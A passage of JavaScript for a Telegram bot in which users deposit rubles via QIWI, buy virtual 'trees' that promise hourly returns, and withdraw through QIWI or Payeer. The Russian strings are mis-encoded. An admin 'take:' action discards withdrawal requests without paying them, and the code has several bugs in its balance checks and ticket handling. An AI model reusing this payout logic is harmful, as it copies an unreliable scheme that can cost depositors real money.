					{ text: getInventoryIcon(3, tree.id), callback_data: getInventoryQuery(3, tree.id) },
					{ text: getInventoryIcon(4, tree.id), callback_data: getInventoryQuery(4, tree.id) },
					{ text: getInventoryIcon(5, tree.id), callback_data: getInventoryQuery(5, tree.id) },
					{ text: getInventoryIcon(6, tree.id), callback_data: getInventoryQuery(6, tree.id) },
				    { text: getInventoryIcon(7, tree.id), callback_data: getInventoryQuery(7, tree.id) },
				], [{ text: `‚ûï –°–æ–±—Ä–∞—Ç—å ${total_balance.toFixed(2)}`, callback_data: `trees:collect` }]
				]
			}
		})

	}

	if (query.data.startsWith('trees:buy')) {
		let total_balance = 0;

		message.user.trees.map((x) => {
			if ((((Date.now() - message.user.lastCollect) / 1000) / 60) * (trees.find((a) => a.id == x.id).earn / 60) > (trees.find((a) => a.id == x.id).earn * 72)) {
				total_balance += trees.find((a) => a.id == x.id).earn * 72;
			} else {
				total_balance += (((Date.now() - message.user.lastCollect) / 1000) / 60) * (trees.find((a) => a.id == x.id).earn / 60);
			}
		});


		let id = Number(query.data.split('trees:buy')[1]);

		let tree = trees.find((x) => x.id == id);
		if (!tree) return bot.answerCallbackQuery(query.id, '–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...', true);

		if (tree.price > message.user.buybalance) return bot.answerCallbackQuery(query.id, 'üö´ –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–µ–Ω–µ–≥ –¥–ª—è –ø–æ–∫—É–ø–∫–∏.', true);
		else if (tree.price <= message.user.buybalance) {
		  
		  var limit = (await User.findOne({ id: 0 })).bhivebalance

			var treesWithEqualId = 0
			message.user.trees.map((t) => { if (t.id == id) treesWithEqualId++ })

			if (treesWithEqualId >= config.limit)
				return bot.answerCallbackQuery(query.id, `üõë –í—ã –¥–æ—Å—Ç–∏–≥–ª–∏ –ª–∏–º–∏—Ç–∞ –≤ ${config.limit} ${config.perss} –¥–∞–Ω–Ω–æ–≥–æ —É—Ä–æ–≤–Ω—è`, true);

			await message.user.set('lastCollect', Date.now());
			await message.user.inc('fetuses', Number(total_balance.toFixed(2)));

			await message.user.trees.push({ id: tree.id, date: Date.now(), lastCollect: Date.now() });
			await message.user.save();
			await User.findOneAndUpdate({ id: uid }, { $inc: { buybalance: -tree.price } })


			return bot.answerCallbackQuery(query.id, `‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–æ–±—Ä–µ–ª–∏ ${tree.name} –∑–∞ ${tree.price}‚ÇΩ`, true);
		}
	}

	if (query.data == 'exchange') {
		if (message.user.fetuses < 1000) return bot.answerCallbackQuery(query.id, 'üö´ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –æ–±–º–µ–Ω–∞: 1000', true);
		let { fetuses } = message.user;
		await message.user.set('fetuses', 0);
		fetuses = fetuses / 1000;
		await message.user.inc('buybalance', fetuses / 2);
		await message.user.inc('outbalance', fetuses / 2);
		bot.deleteMessage(message.chat.id, message.message_id);
		return bot.answerCallbackQuery(query.id, `‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –æ–±–º–µ–Ω—è–ª–∏ ${(fetuses * 1000).toFixed(2)}  –Ω–∞ ${fetuses.toFixed(2)}‚ÇΩ`, true);
	}

	
	if(query.data == 'deposit') {
		await bot.sendMessage(message.chat.id, `–í—ã–±–µ—Ä–∏ —Å–ø–æ—Å–æ–± –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è`, {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[{ text: "ü•ù Qiwi", callback_data: "depositqiwi" }]
				]
			}
		});
	} 

	if(query.data == 'depositqiwi') {
		await bot.sendMessage(message.chat.id, `ü•ù –°–ø–æ—Å–æ–± –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: QIWI

üåê –û—Ç–ø—Ä–∞–≤—å—Ç–µ –ª—é–±—É—é —Å—É–º–º—É –Ω–∞ –∫–æ—à–µ–ª–µ–∫ <code>+${config.qiwinumber}</code>
‚ÄºÔ∏è —Å –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–µ–º <code>SM${message.chat.id}</code>`, {
			parse_mode: "HTML"
		});
	}


	if (query.data == 'game_prize') {
		if (message.user.prize) return bot.answerCallbackQuery(query.id, 'üôÇ –í—ã —É–∂–µ –ø–æ–ª—É—á–∏–ª–∏ —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫!', true);
		bot.deleteMessage(message.chat.id, message.message_id);
		return bot.sendMessage(message.chat.id, `üéÅ <b>–ü–æ–¥–∞—Ä–æ–∫ - ${config.prize}</b>\n
–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–∞ –ø–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –∫–∞–Ω–∞–ª:
‚ñ´Ô∏è @${config.prizecheck},@End_Soft`, {
			parse_mode: "HTML",
			reply_markup: { inline_keyboard: [[{ text: "‚úÖ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É", callback_data: "game_prize_check" }]] }
		});
	}

	if (query.data == 'game_prize_check') {
    	var res = await bot.getChatMember(`@${config.prizecheck}`, message.chat.id)
	    var res = await bot.getChatMember(`@End_Soft`, message.chat.id)
	if (message.user.prize) return bot.answerCallbackQuery(query.id, 'üôÇ –í—ã —É–∂–µ –ø–æ–ª—É—á–∏–ª–∏ —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫!', true);
		if (res.status == 'left') return bot.answerCallbackQuery(query.id, '‚ùå –í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–ª–∏—Å—å –Ω–∞ –∫–∞–Ω–∞–ª!', true);
		await bot.deleteMessage(message.chat.id, message.message_id);
		message.user.trees.push({
			id: config.prizeid,
			date: Date.now(),
			lastCollect: Date.now()
		});
		message.user.prize = true
		await message.user.save();
		return bot.sendMessage(message.chat.id, `üéÅ <b>–í—ã –ø–æ–ª—É—á–∏–ª–∏ –ø–æ–¥–∞—Ä–æ–∫! ${config.prize} —É–∂–µ —É –≤–∞—Å</b>`, {
			parse_mode: "HTML",
		});
	}

	if (query.data == 'withdraw') {
		if (message.user.outbalance < config.minwithdraw) return bot.answerCallbackQuery(query.id, `üö´ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: ${config.minwithdraw}‚ÇΩ`, true);
		bot.deleteMessage(message.chat.id, message.message_id);
		
		await message.user.set('menu', 'qiwi');
		await bot.sendMessage(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä QIWI –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞:\n–ù–∞–ø—Ä–∏–º–µ—Ä: +79001234567', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});
	}

	if (query.data == 'reinvest') {
		await message.user.set('menu', 'reinvest');
		return bot.sendMessage(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ —Ä–µ–∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å.', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});
	}

	if (query.data == 'trees:collect') {
		let total_balance = 0;

		message.user.trees.map((x) => {
			total_balance += (((Date.now() - message.user.lastCollect) / 1000) / 60) * (trees.find((a) => a.id == x.id).earn / 60);
		});

		await message.user.set('lastCollect', Date.now());

		await bot.deleteMessage(message.chat.id, message.message_id);
		await message.user.inc('fetuses', Number(total_balance.toFixed(2)));
		if (message.user.clanName) {
			var clan = await Clan.findOne({ name: message.user.clanName })
			await Clan.findOneAndUpdate({ name: message.user.clanName }, { $inc: { balance: total_balance * (clan.level / 100) } })
		}
		return bot.answerCallbackQuery(query.id, `–í—ã —É—Å–ø–µ—à–Ω–æ —Å–æ–±—Ä–∞–ª–∏ ${total_balance.toFixed(2)} `, true);
	}

	if (query.data == 'trees:totalMy') {
		let $trees = [];
		let total_earn = 0;

		message.user.trees.map((x) => {
			$trees.push(x.id);
			total_earn += trees.find((a) => a.id == x.id).earn
		});

		let text = ``;
		if ($trees.filter((x) => x === 0).length) text += `\n\n<b>${trees.find((x) => x.id == 0).name}</b>\n\t\t‚ñ´Ô∏è –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${$trees.filter((x) => x === 0).length}\n\t\t‚ñ™Ô∏è ${config.threetextthree}  –≤ —á–∞—Å: ${$trees.filter((x) => x === 0).length * trees.find((x) => x.id == 0).earn}`;
		if ($trees.filter((x) => x === 1).length) text += `\n\n<b>${trees.find((x) => x.id == 1).name}</b>\n\t\t‚ñ´Ô∏è –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${$trees.filter((x) => x === 1).length}\n\t\t‚ñ™Ô∏è ${config.threetextthree}  –≤ —á–∞—Å: ${$trees.filter((x) => x === 1).length * trees.find((x) => x.id == 1).earn}`;
		if ($trees.filter((x) => x === 2).length) text += `\n\n<b>${trees.find((x) => x.id == 2).name}</b>\n\t\t‚ñ´Ô∏è –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${$trees.filter((x) => x === 2).length}\n\t\t‚ñ™Ô∏è ${config.threetextthree}  –≤ —á–∞—Å: ${$trees.filter((x) => x === 2).length * trees.find((x) => x.id == 2).earn}`;
		if ($trees.filter((x) => x === 3).length) text += `\n\n<b>${trees.find((x) => x.id == 3).name}</b>\n\t\t‚ñ´Ô∏è –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${$trees.filter((x) => x === 3).length}\n\t\t‚ñ™Ô∏è ${config.threetextthree}  –≤ —á–∞—Å: ${$trees.filter((x) => x === 3).length * trees.find((x) => x.id == 3).earn}`;
		if ($trees.filter((x) => x === 4).length) text += `\n\n<b>${trees.find((x) => x.id == 4).name}</b>\n\t\t‚ñ´Ô∏è –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${$trees.filter((x) => x === 4).length}\n\t\t‚ñ™Ô∏è ${config.threetextthree}  –≤ —á–∞—Å: ${$trees.filter((x) => x === 4).length * trees.find((x) => x.id == 4).earn}`;
		if ($trees.filter((x) => x === 5).length) text += `\n\n<b>${trees.find((x) => x.id == 5).name}</b>\n\t\t‚ñ´Ô∏è –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${$trees.filter((x) => x === 5).length}\n\t\t‚ñ™Ô∏è ${config.threetextthree}  –≤ —á–∞—Å: ${$trees.filter((x) => x === 5).length * trees.find((x) => x.id == 5).earn}`;
		if ($trees.filter((x) => x === 6).length) text += `\n\n<b>${trees.find((x) => x.id == 6).name}</b>\n\t\t‚ñ´Ô∏è –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${$trees.filter((x) => x === 6).length}\n\t\t‚ñ™Ô∏è ${config.threetextthree}  –≤ —á–∞—Å: ${$trees.filter((x) => x === 6).length * trees.find((x) => x.id == 6).earn}`;
		if ($trees.filter((x) => x === 7).length) text += `\n\n<b>${trees.find((x) => x.id == 7).name}</b>\n\t\t‚ñ´Ô∏è –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${$trees.filter((x) => x === 7).length}\n\t\t‚ñ™Ô∏è ${config.threetextthree}  –≤ —á–∞—Å: ${$trees.filter((x) => x === 7).length * trees.find((x) => x.id == 7).earn}`;

		return bot.editMessageText(`üìÑ –°–ø–∏—Å–æ–∫ –≤–∞—à–∏—Ö ${config.perss}: ‚§µÔ∏è${text}\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\nüìä –°—É–º–º–∞—Ä–Ω—ã–π –¥–æ—Ö–æ–¥ ${config.perss} –≤ —á–∞—Å: ${total_earn.toFixed(2)}`, {
			parse_mode: "HTML",
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if (query.data.startsWith('withdraw:')) {
		let id = Number(query.data.split('withdraw:')[1]);
		let ticket = await Ticket.findOne({ id });
	
		if (!ticket) bot.deleteMessage(message.chat.id, message.message_id);
		
	
		if (ticket.wallet.indexOf("P") == -1) { // –ü–ª–∞—Ç—ë–∂ —á–µ—Ä–µ–∑ QIWI
		  bot.sendMessage(`@${config.deposit}`, `<a href="tg://user?id=${ticket.id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –≤—ã–≤–µ–ª <b>${ticket.amount}‚ÇΩ</b>\n–ü–°: QIWI`, { parse_mode: "HTML" })
		  qiwi.toWallet({ account: String(ticket.wallet), amount: ticket.amount, comment: `–í—ã–ø–ª–∞—Ç–∞ –æ—Ç @${config.bot}` }, () => { });
		}
		else // –ü–ª–∞—Ç—ë–∂ —á–µ—Ä–µ–∑ Payeer
		{
		  bot.sendMessage(`@${config.deposit}`, `<a href="tg://user?id=${ticket.id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –≤—ã–≤–µ–ª <b>${ticket.amount}‚ÇΩ</b>\n–ü–°: PAYEER`, { parse_mode: "HTML" })
		  require('request')({
			method: 'POST',
			url: 'https://payeer.com/ajax/api/api.php',
			headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
			body: `account=${config.account}&apiId=${config.apiId}&apiPass=${config.apiPass}&action=transfer&curIn=RUB&sum=${ticket.amount * 1.01}&curOut=RUB&to=${ticket.wallet}
		  `}, async function (error, response, body) {
			body = JSON.parse(body)
		  })
		}
	  await ticket.remove();
		bot.sendMessage(ticket.id,` ‚úÖ <b>–í–∞—à–∞ –≤—ã–ø–ª–∞—Ç–∞ –±—ã–ª–∞ –æ–¥–æ–±—Ä–µ–Ω–∞</b>
	üí∏ –ù–∞ –í–∞—à ${ticket.wallet.indexOf("P") == -1 ? "QIWI" : "Payeer"} –∑–∞—á–∏—Å–ª–µ–Ω–æ <b>${ticket.amount}‚ÇΩ</b>\n
	
	üôè –ë—É–¥–µ–º –æ—á–µ–Ω—å –ø—Ä–∏–∑–Ω–∞—Ç–µ–ª—å–Ω—ã –∑–∞ –æ—Ç–∑—ã–≤ –æ –±–æ—Ç–µ –∞–¥–º–∏–Ω—É –∏–ª–∏ –≤ —á–∞—Ç
	‚ò∫Ô∏è –î–ª—è –Ω–∞—Å —ç—Ç–æ –æ—á–µ–Ω—å –≤–∞–∂–Ω–æ\n
	ü§ù <b>–†–∞–¥—ã —Å–æ—Ç—Ä—É–¥–Ω–∏—á–∞—Ç—å!</b>
	`, {
		  parse_mode: "html", reply_markup: {
			inline_keyboard: [
			  [{ text: "üë®‚Äçüíª –ê–¥–º–∏–Ω", url: `https://t.me/${config.admin}` },
			  { text: "üí¨ –ß–∞—Ç", url: `https://t.me/${config.chat}` }],
			  [{ text: "üí≥ –í—ã–ø–ª–∞—Ç—ã", url: `https://t.me/${config.deposit}` }],
			]
		  }
		});
		await User.findOneAndUpdate({ id: 0 }, { $inc: { fc: ticket.amount } })
		await User.findOneAndUpdate({ id: id }, { $inc: { payout: ticket.amount } }) 
	out += Math.floor(ticket.amount);
	await ticket.remove();
		bot.editMessageText('–í—ã–ø–ª–∞—Ç–∏–ª!', {
		  chat_id: message.chat.id,
		  message_id: message.message_id
		});
	  }

	if (query.data.startsWith('back:')) {
		let id = Number(query.data.split('back:')[1]);
		let ticket = await Ticket.findOne({ id });

		if (!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		let user = await User.findOne({ id: ticket.id });
		bot.sendMessage(ticket.id, `–í–∞—à–∞ –≤—ã–ø–ª–∞—Ç–∞ –±—ã–ª–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞, –Ω–∞ –≤–∞—à —Å—á—ë—Ç –≤–æ–∑–≤—Ä–∞—â–µ–Ω–æ ${ticket.amount}‚ÇΩ`);

		await user.inc('buybalance', ticket.amount);
		await ticket.remove();

		return bot.editMessageText('–í–µ—Ä–Ω—É–ª!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if (query.data.startsWith('take:')) {
		let id = Number(query.data.split('take:')[1]);
		let ticket = await Ticket.findOne({ id });

		if (!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		await ticket.remove();
		return bot.editMessageText('–ó–∞–±—Ä–∞–ª!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}
	var d = query.data

	if (d == "clan_create") {
		if (message.user.buybalance < 65)
			return bot.answerCallbackQuery(query.id, `–ù–∞ –í–∞—à–µ–º –±–∞–ª–∞–Ω—Å–µ –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è ${config.teplica_four} !`, true);
		state[uid] = 1601
		bot.deleteMessage(message.chat.id, message.message_id);
		return bot.sendMessage(message.chat.id, `–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –¥–ª—è –í–∞—à–µ–π ${config.teplica_four}:`, { reply_markup: { keyboard: Cancel, resize_keyboard: true } });
	}

	if (d == "clan_payin") {
		var clan = await Clan.findOne({ name: message.user.clanName })
		if (!clan) return bot.answerCallbackQuery(query.id, `–û—à–∏–±–∫–∞!`, true);
		state[uid] = 160101
		bot.deleteMessage(message.chat.id, message.message_id);
		return bot.sendMessage(message.chat.id, `üí≥ <b>–í–∞—à –±–∞–ª–∞–Ω—Å –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π:</b> ${message.user.buybalance}‚ÇΩ\n–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –í–∞—à–µ–π ${config.teplica_four}:`, { parse_mode: "html", reply_markup: { keyboard: Cancel, resize_keyboard: true } });
	}
	if (d == "clan_admin") {
		var clan = await Clan.findOne({ name: message.user.clanName })
		var members = await User.find({ id: { $ne: uid }, clanName: clan.name })
		if (uid != clan.creator_id && uid != clan.zam_id) return bot.answerCallbackQuery(query.id, `–û—à–∏–±–∫–∞!`, true);
		bot.deleteMessage(message.chat.id, message.message_id);
		return bot.sendMessage(message.chat.id, `
<b>–í–∞—à–∞ ${config.teplica_three}:</b> ${clan.name}
		
<b>–£—á–∞—Å—Ç–Ω–∏–∫–∏ ${config.teplica_four}:</b>
<a href="tg://user?id=${uid}">${clan.creator_name}</a> | ${message.user.totalEarn} –≤ —á–∞—Å | ID: <code>${uid}</code>
${members.map(m => { return `${m.id == clan.zam_id ? `üë®‚Äç‚öïÔ∏è <b>–í–∞—à –∑–∞–º–µ—Å—Ç–∏—Ç–µ–ª—å: </b>` : ""}<a href="tg://user?id=${m.id}">${m.name}</a> | ${m.totalEarn} –≤ —á–∞—Å | ID: <code>${m.id}</code>` }).join("\n")}
<b>–î–æ—Ö–æ–¥ ${config.teplica_four}:</b> ${clan.level}%
<b>–í—Å–µ–≥–æ –∏–≥—Ä–æ–∫–æ–≤ –≤ ${config.teplica_one}:</b> ${members.length + 1} –∏–∑ ${clan.maxMembers}
<b>–î–æ—Ö–æ–¥–Ω–æ—Å—Ç—å ${config.teplica_four}:</b> ${roundPlus(clan.total_earn)} /—á–∞—Å
<b>–í –∫–∞–∑–Ω–µ:</b> ${roundPlus(clan.balance)} 
<b>–ù–∞ –±–∞–ª–∞–Ω—Å–µ:</b> ${roundPlus(clan.bal)}‚ÇΩ\n
<b>–ö–æ–º–∞–Ω–¥—ã –≥–ª–∞–≤—ã:</b>
–ü—Ä–∏–≥–ª–∞—Å–∏—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–∞ - <code>/invite [id]</code>
–í—ã–≥–Ω–∞—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–∞ - <code>/kick [id]</code>
–ù–∞–∑–Ω–∞—á–∏—Ç—å –∑–∞–º–µ—Å—Ç–∏—Ç–µ–ª—è - <code>/invitezam [id]</code>
–£–±—Ä–∞—Ç—å –∑–∞–º–µ—Å—Ç–∏—Ç–µ–ª—è - <code>/removezam</code>
`, {
			parse_mode: "html", reply_markup: {
				inline_keyboard: [
					[{ text: "1‚É£ –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –∫–∞–∑–Ω—É —Å–µ–±–µ", callback_data: "clan_transferMe" }],
					[{ text: "2‚É£ –†–∞—Å–ø—Ä–µ–¥–µ–ª–∏—Ç—å –∫–∞–∑–Ω—É", callback_data: "clan_transferAll" }],
					[{ text: `3‚É£ –†–∞—Å—à–∏—Ä–∏—Ç—å ${config.teplica_five} –¥–æ ${clan.maxMembers + 10} –º–µ—Å—Ç (65 —Ä—É–±–ª–µ–π)`, callback_data: "clan_expand" }],
					[{ text: `4Ô∏è‚É£ –ü–æ–≤—ã—Å–∏—Ç—å –¥–æ—Ö–æ–¥–Ω–æ—Å—Ç—å –∫–∞–∑–Ω—ã –¥–æ ${clan.level + 1}% (${150 + (clan.level - 1) * 50} —Ä—É–±–ª–µ–π)`, callback_data: "clan_upLevel" }],
				]
			}
		});
	}
	if (d == "clan_transferMe") {
		var clan = await Clan.findOne({ name: message.user.clanName })
		var members = await User.find({ id: { $ne: uid }, clanName: clan.name })
		if (uid != clan.creator_id && uid != clan.zam_id) return bot.answerCallbackQuery(query.id, `–û—à–∏–±–∫–∞!`, true);
		if (clan.balance == 0) return bot.answerCallbackQuery(query.id, `–ö–∞–∑–Ω–∞ ${config.teplica_four} –Ω—É–ª–µ–≤–∞—è!`, true);
		bot.deleteMessage(message.chat.id, message.message_id);
		await Clan.findOneAndUpdate({ name: clan.name }, { balance: 0 })
		await User.findOneAndUpdate({ id: uid }, { $inc: { buybalance: (clan.balance / 2000), outbalance: (clan.balance / 2000) } })
		return bot.sendMessage(message.chat.id, `<b>${clan.balance} ${config.threetextthree} </b> –∏–∑ –∫–∞–∑–Ω—ã ${config.teplica_four} –Ω–∞—á–∏—Å–ª–µ–Ω—ã –í–∞–º –∫–∞–∫ <b>${roundPlus(clan.balance / 2000)}‚ÇΩ</b> –Ω–∞ –±–∞–ª–∞–Ω—Å –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –∏ <b>${roundPlus(clan.balance / 2000)}‚ÇΩ</b> –Ω–∞ –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞`, { parse_mode: "html" });
	}
	if (d == "clan_transferAll") {
		var clan = await Clan.findOne({ name: message.user.clanName })
		var members = await User.find({ clanName: clan.name })
		if (uid != clan.creator_id && uid != clan.zam_id) return bot.answerCallbackQuery(query.id, `–û—à–∏–±–∫–∞!`, true);
		if (clan.balance == 0) return bot.answerCallbackQuery(query.id, `–ö–∞–∑–Ω–∞ ${config.teplica_four} –Ω—É–ª–µ–≤–∞—è!`, true);
		bot.deleteMessage(message.chat.id, message.message_id);
		await Clan.findOneAndUpdate({ name: clan.name }, { balance: 0 })
		var dole = clan.balance / members.length / 2000
		for (const i in members) {
			try {
				await User.findOneAndUpdate({ id: members[i].id }, { $inc: { buybalance: dole, outbalance: dole } })
				await bot.sendMessage(members[i].id, `<b>${roundPlus(clan.balance)} ${config.threetextthree} </b> –∏–∑ –∫–∞–∑–Ω—ã ${config.teplica_four} —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω—ã –º–µ–∂–¥—É —É—á–∞—Å—Ç–Ω–∏–∫–∞–º–∏ ${config.teplica_four}\n–í–∞–º –Ω–∞—á–∏—Å–ª–µ–Ω–æ <b>${roundPlus(dole)}‚ÇΩ</b> –Ω–∞ –±–∞–ª–∞–Ω—Å –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –∏ <b>${roundPlus(dole)}‚ÇΩ</b> –Ω–∞ –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞`, { parse_mode: "html" });
			}
			catch { }
		}
	}
	if (d == "clan_expand") {
		var clan = await Clan.findOne({ name: message.user.clanName })
		if (uid != clan.creator_id && uid != clan.zam_id) return bot.answerCallbackQuery(query.id, `–û—à–∏–±–∫–∞!`, true);
		if (clan.bal < 65) return bot.answerCallbackQuery(query.id, `–ù–∞ –±–∞–ª–∞–Ω—Å–µ ${config.teplica_four} –Ω–µ–¥–æ—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤!`, true);
		bot.deleteMessage(message.chat.id, message.message_id);
		await Clan.findOneAndUpdate({ name: clan.name }, { $inc: { maxMembers: 10, bal: -65 } })
		await bot.sendMessage(uid, `–í—ã —É—Å–ø–µ—à–Ω–æ —Ä–∞—Å—à–∏—Ä–∏–ª–∏ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –º–µ—Å—Ç –≤ ${config.teplica_one} –¥–æ ${clan.maxMembers + 10}`, { parse_mode: "html" });

	}
	if (d == "clan_upLevel") {
		var clan = await Clan.findOne({ name: message.user.clanName })
		if (uid != clan.creator_id && uid != clan.zam_id) return bot.answerCallbackQuery(query.id, `–û—à–∏–±–∫–∞!`, true);
		if (clan.level >= 200000000000000000) return bot.answerCallbackQuery(query.id, `–í—ã –¥–æ—Å—Ç–∏–≥–ª–∏ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ —É—Ä–æ–≤–Ω—è —É–≤–µ–ª–∏—á–µ–Ω–∏—è –¥–æ—Ö–æ–¥–Ω–æ—Å—Ç–∏ –∫–∞–∑–Ω—ã!`, true);
		var price = 150 + (clan.level - 1) * 50
		if (clan.bal < 65) return bot.answerCallbackQuery(query.id, `–ù–∞ –±–∞–ª–∞–Ω—Å–µ ${config.teplica_four} –Ω–µ–¥–æ—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤!`, true);
		bot.deleteMessage(message.chat.id, message.message_id);
		await Clan.findOneAndUpdate({ name: clan.name }, { $inc: { level: 1, bal: -price } })
		await bot.sendMessage(uid, `–í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–≤—ã—Å–∏–ª–∏ –¥–æ—Ö–æ–¥–Ω–æ—Å—Ç—å –∫–∞–∑–Ω—ã ${config.teplica_four} –¥–æ ${clan.level + 1}%`, { parse_mode: "html" });

	}
	if (d.startsWith("clanAccept")) {
		var clan = await Clan.findOne({ _id: d.split("_")[1] })
		var members = await User.find({ clanName: clan.name })
		if (members.length > clan.maxMembers - 1) return bot.answerCallbackQuery(query.id, `–í ${config.teplica_one} –∑–∞–∫–æ–Ω—á–∏–ª–∏—Å—å –º–µ—Å—Ç–∞!`, true);
		bot.deleteMessage(message.chat.id, message.message_id);
		await User.findOneAndUpdate({ id: uid }, { clanName: clan.name })
		await bot.sendMessage(uid, `‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –≤—Å—Ç—É–ø–∏–ª–∏ –≤ ${config.teplica_five} <b>${clan.name}</b>\n–ù–∞–∂–º–∏—Ç–µ /leave_clan, —á—Ç–æ–±—ã –ø–æ–∫–∏–Ω—É—Ç—å ${config.teplica_five}`, { parse_mode: "html" });
		bot.sendMessage(clan.creator_id, `‚ûï –í –í–∞—à—É ${config.teplica_five} –≤—Å—Ç—É–ø–∏–ª <a href="tg://user?id=${uid}">–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a>\n–í–≤–µ–¥–∏—Ç–µ <code>/kick ${uid}</code>, —á—Ç–æ–±—ã –≤—ã–≥–Ω–∞—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–∞ –∏–∑ ${config.teplica_four}`, { parse_mode: "html" });
		totalClanEarnCalc()
	}
	if (d == "clanDecline") {
		bot.sendMessage(uid, ` ‚ùå –í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –∑–∞—è–≤–∫—É –Ω–∞ –≤—Å—Ç—É–ø–ª–µ–Ω–∏–µ –≤ ${config.teplica_five}!`, { parse_mode: "html" });
	}

	if (d == "clan_top") {
		var clans = await Clan.find({ $and: [{ name: { $ne: "." } }, { name: { $ne: "dsfsdf" } }] }).sort({ total_earn: -1 }).limit(5)
		bot.deleteMessage(message.chat.id, message.message_id);
		if (clans.length == 5)
			return bot.sendMessage(message.chat.id, `
<b>üèÜ –¢–û–ü 5 ${config.teplica_six} üî±</b>

üëë ${clans[0].name} | ${clans[0].total_earn} 

2‚É£ ${clans[1].name} | ${clans[1].total_earn} 

3‚É£${clans[2].name} | ${clans[2].total_earn} 

4‚É£ ${clans[3].name} | ${clans[3].total_earn} 

5‚É£ ${clans[4].name} | ${clans[4].total_earn} `, { parse_mode: "html" });
		else
			return bot.sendMessage(message.chat.id, `<b>üèÜ –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ ${config.teplica_six} –¥–ª—è —Å–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Ç–æ–ø–∞</b>`, { parse_mode: "html" });

	}
	if (d == "clan_status") {
		var clans = await Clan.find({ $and: [{ name: { $ne: "." } }, { name: { $ne: "dsfsdf" } }] }).sort({ total_earn: -1 }).limit(5)
		bot.deleteMessage(message.chat.id, message.message_id);
		var ost = Math.ceil((getNextClanWarTimestamp() - (new Date()).getTime()) / (1000 * 60 * 60 * 24))
		if (clans.length == 5)
			return bot.sendMessage(message.chat.id, `
<b> –ë–∏—Ç–≤–∞ ${config.teplica_six}</b>

